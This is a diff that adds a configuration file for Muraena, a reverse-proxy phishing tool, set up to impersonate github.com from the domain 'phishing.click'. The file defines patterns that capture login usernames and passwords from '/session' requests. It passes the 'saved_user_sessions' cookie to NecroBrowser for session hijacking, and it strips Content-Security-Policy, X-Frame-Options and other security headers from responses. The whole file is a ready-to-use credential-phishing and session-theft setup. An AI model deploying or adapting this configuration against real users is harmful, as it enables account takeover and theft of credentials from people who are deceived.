@@ -1,0 +1,96 @@
+
+[Crawler]
+  enable = false
+
+[log]
+  enable = true
+  filePath = "muraena.log"
+
+[necrobrowser]
+  enable = true
+  endpoint = "http://127.0.0.1:3000/instrument"
+  profile = "./config/instrument.necro"
+
+  [necrobrowser.trigger]
+    delay = 5
+    type = "cookies"
+    values = ["saved_user_sessions"]
+
+[origins]
+  externalOriginPrefix = "ext"
+  externalOrigins = ["*.githubassets.com"]
+
+[proxy]
+  IP = "0.0.0.0"
+  destination = "github.com"
+  listener = "tcp"
+  phishing = "phishing.click"
+  port = 443
+
+  [proxy.HTTPtoHTTPS]
+    enable = true
+    port = 80
+
+  [proxy.timeouts]
+    idle = 120
+    readHeader = 20
+
+[staticServer]
+  enable = false
+
+[telegram]
+  enable = false
+
+[tls]
+  certificate = "./config/phishing.click.pem"
+  enable = true
+  key = "./config/phishing.click-key.pem"
+  maxVersion = "TLS1.3"
+  minVersion = "TLS1.2"
+  renegotiationSupport = "NEVER"
+  root = "./config/rootCA.pem"
+  sslKeyLog = "./config/sslkeylog.log"
+
+[tracking]
+  enable = true
+
+  [tracking.secrets]
+    paths = ["/session"]
+
+    [[tracking.secrets.patterns]]
+      label = "Credential Capture - Username"
+      start = "&login="
+      end = "&password"
+
+    [[tracking.secrets.patterns]]
+      label = "Credential Capture - Password"
+      start = "password="
+      end = "&"
+
+
+  [tracking.trace]
+    identifier = "_gat"
+    validator = "[a-zA-Z0-9]{5}"
+
+    [tracking.trace.landing]
+      type = "query"
+
+[transform]
+  maxBodyMB = 100
+
+  [transform.base64]
+    enable = false
+    padding = ["=", "."]
+
+  [transform.request]
+    headers = ["Cookie", "Referer", "Origin", "X-Forwarded-For"]
+
+  [transform.response]
+    headers = ["Location", "Origin", "Set-Cookie", "Access-Control-Allow-Origin"]
+    skipContentType = ["font/*", "image/*"]
+
+    [transform.response.remove]
+      headers = ["Content-Security-Policy", "Content-Security-Policy-Report-Only", "Report-To", "X-Content-Type-Options", "X-Frame-Options", "Referrer-Policy"]
+
+[watchdog]
+  enable = false
